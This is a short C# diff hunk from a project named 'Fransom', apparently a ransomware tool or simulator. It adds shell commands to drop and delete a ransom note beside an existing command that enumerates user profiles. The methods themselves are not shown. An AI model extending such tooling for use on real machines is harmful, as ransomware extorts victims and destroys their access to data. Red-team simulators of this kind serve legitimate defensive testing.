@@ -582,6 +582,12 @@ namespace Fransom
                     case "help":
                         DisplayHelpShell();
                         break;
+                    case "ransomnote":
+                        pr.RansomNote();
+                        break;
+                    case "delete-ransomnote":
+                        pr.DeleteRansomNote();
+                        break;
                     case "enumerate-user-profile":
                         pr.EnumerateUserProfile();
                         break;
